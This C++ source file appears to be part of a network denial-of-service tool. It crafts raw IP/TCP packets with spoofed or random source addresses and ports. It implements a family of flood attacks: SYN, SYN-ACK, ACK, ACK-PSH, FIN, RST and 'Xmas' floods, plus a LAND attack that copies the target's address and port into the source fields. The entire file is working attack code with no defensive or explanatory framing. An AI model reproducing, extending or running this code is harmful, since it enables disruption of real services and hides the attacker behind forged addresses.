#include "spoofed_tcp_flood.hpp"
#include "stdafx.hpp"
#include "utils.hpp"

spoofed_tcp_flood::spoofed_tcp_flood() : base_spoofed_flood(IPPROTO_TCP) {}

char *spoofed_tcp_flood::gen_hdr(sockaddr_in *dst, int len) {
  char *string = new char[len];

  auto *ip = (iphdr *)string;
  auto *tcp = (tcphdr *)(string + sizeof(iphdr));
  std::string ipaddr{};
  bzero(string, (size_t)len);

  init_hdr(tcp, ip);

  ip->daddr = dst->sin_addr.s_addr;

  if (Config::get().rand_lhost) {
    utils::randomizer::randomIP(ipaddr);
    ip->saddr = inet_addr(ipaddr.c_str());
  } else
    ip->saddr = 0;

  ip->tot_len = htons((uint16_t)len);

  if (Config::get().rand_lport)
    tcp->th_sport = htons((uint16_t)utils::randomizer::randomPort());
  else
    tcp->th_sport = 0;

  finalize_hdr(tcp, ip);

  return string;
}

void spoofed_tcp_flood::init_hdr(tcphdr *tcp, iphdr *ip) {
  ip->ihl = sizeof(struct iphdr) / 4;
  ip->version = 4;
  ip->tos = 16;
  ip->id = htons((uint16_t)utils::randomizer::randomInt(1, 1000));
  ip->frag_off = htons(0x0);
  ip->ttl = 255;
  ip->protocol = IPPROTO_TCP;

  tcp->th_dport = htons((uint16_t)utils::to_int(Config::get().rport));
  tcp->th_seq = htonl((uint16_t)utils::randomizer::randomInt(1, 1000));
  tcp->th_ack = htonl((uint16_t)utils::randomizer::randomInt(1, 1000));
  tcp->th_off = sizeof(struct tcphdr) / 4;
  tcp->th_win = htons(5840);
  tcp->th_flags = TH_SYN;
}

void spoofed_tcp_flood::finalize_hdr(tcphdr *tcp, iphdr *ip) {
  pshdr psh{};
  psh.saddr = ip->saddr;
  psh.daddr = ip->daddr;

  bcopy(tcp, &psh.tcp, sizeof(tcphdr));

  tcp->th_sum = utils::csum((unsigned short *)&psh, sizeof(psh));
}

syn_flood::syn_flood() : spoofed_tcp_flood() {}

syn_ack_flood::syn_ack_flood() : spoofed_tcp_flood() {}

void syn_ack_flood::finalize_hdr(tcphdr *tcp, iphdr *ip) {
  tcp->th_flags = TH_SYN | TH_ACK;
  spoofed_tcp_flood::finalize_hdr(tcp, ip);
}

ack_flood::ack_flood() : spoofed_tcp_flood() {}

void ack_flood::finalize_hdr(tcphdr *tcp, iphdr *ip) {
  tcp->th_flags = TH_ACK;
  spoofed_tcp_flood::finalize_hdr(tcp, ip);
}

ack_psh_flood::ack_psh_flood() : spoofed_tcp_flood() {}

void ack_psh_flood::finalize_hdr(tcphdr *tcp, iphdr *ip) {
  tcp->th_flags = TH_ACK | TH_PUSH;
  spoofed_tcp_flood::finalize_hdr(tcp, ip);
}

fin_flood::fin_flood() : spoofed_tcp_flood() {}

void fin_flood::finalize_hdr(tcphdr *tcp, iphdr *ip) {
  tcp->th_flags = TH_FIN;
  spoofed_tcp_flood::finalize_hdr(tcp, ip);
}

rst_flood::rst_flood() : spoofed_tcp_flood() {}

void rst_flood::finalize_hdr(tcphdr *tcp, iphdr *ip) {
  tcp->th_flags = TH_RST;
  spoofed_tcp_flood::finalize_hdr(tcp, ip);
}

xmas_flood::xmas_flood() : spoofed_tcp_flood() {}

void xmas_flood::finalize_hdr(tcphdr *tcp, iphdr *ip) {
  tcp->th_flags = TH_SYN | TH_ACK | TH_FIN | TH_PUSH | TH_RST | TH_URG;
  spoofed_tcp_flood::finalize_hdr(tcp, ip);
}

land::land() : spoofed_tcp_flood() {}

void land::finalize_hdr(tcphdr *tcp, iphdr *ip) {
  ip->saddr = ip->daddr;
  tcp->th_flags = TH_SYN;
  tcp->th_sport = tcp->th_dport;
  spoofed_tcp_flood::finalize_hdr(tcp, ip);
}